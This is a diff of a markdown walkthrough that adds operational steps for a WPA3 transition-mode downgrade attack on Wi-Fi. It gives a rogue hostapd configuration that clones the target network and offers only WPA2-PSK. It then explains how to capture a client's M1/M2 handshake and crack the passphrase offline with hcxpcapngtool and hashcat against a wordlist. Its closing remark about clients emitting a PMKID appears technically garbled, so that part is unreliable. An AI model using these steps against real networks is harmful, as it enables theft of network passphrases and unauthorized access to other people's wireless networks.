@@ -9,25 +9,51 @@ If the RSN IE carries both AKM 2 (PSK) and AKM 8 (SAE), the WPA2 side
 is a full backdoor to the WPA3 password (they share the passphrase in
 every transition deployment).
 
+**How the capture actually happens** — the mechanics that get you the
+M1+M2 material to feed hashcat:
+
+1. Target AP is broadcasting a transition-mode beacon: RSN IE lists
+   both AKM 2 (PSK) *and* AKM 8 (SAE) as key-mgmt selectors.
+2. Rogue hostapd (below) advertises **only AKM 2** in its beacon,
+   otherwise cloning the target's SSID+BSSID onto a clear channel.
+3. A WPA2-capable client that has the passphrase memorized (this is
+   *any* pre-2024 phone or laptop associated with the network — WPA3
+   transition mode forces the passphrase to be reused) sees the rogue
+   beacon and, on the rogue's channel, has no SAE option — it falls
+   back to WPA2-PSK.
+4. Rogue hostapd, acting as authenticator, sends **M1 with a fresh
+   ANonce** to the client.
+5. Client computes PMK = PBKDF2(passphrase, SSID, 4096, 256) — using
+   *its real passphrase* — derives PTK, and responds with **M2
+   containing the MIC** over the RSN IE + SNonce keyed by that PTK.
+6. hostapd logs M1 + M2. That MIC is the offline-crackable material.
+   Convert with `hcxpcapngtool` and feed hashcat `-m 22000`.
+
+You do not need to complete M3/M4; M2's MIC alone is the hash.
+
 ```
-# See dragonblood-deep/walkthrough.md Path A. Short form:
+# Short form — see dragonblood-deep/walkthrough.md Path A for detail.
 cat > /tmp/wpa2rogue.conf <<EOF
 interface=wlan1
 ssid=<TargetSSID>
 hw_mode=g
 channel=6
 wpa=2
-wpa_key_mgmt=WPA-PSK
+wpa_key_mgmt=WPA-PSK          # rogue advertises AKM 2 only
 rsn_pairwise=CCMP
-wpa_passphrase=whatever   # placeholder; the client's 4-way is what we want
+wpa_passphrase=whatever       # placeholder; the client's PTK is what we want
 EOF
-hostapd /tmp/wpa2rogue.conf
+hostapd /tmp/wpa2rogue.conf   # simultaneously run airodump/tshark to log EAPOL
 
-# WPA2 4-way lands via any WPA2-capable client that fails over.
 # Convert + crack:
 hcxpcapngtool -o /tmp/hs.22000 <capture>.pcapng
 hashcat -m 22000 /tmp/hs.22000 rockyou.txt
 ```
+
+If PMKID is easier to obtain (some clients emit PMKID in the
+first EAPOL frame before completing M2), pivot to
+`pmkid/walkthrough.md` — same hashcat mode, no client dependency
+on completing the whole handshake.
 
 ## Path B — Dragonblood side channels
 
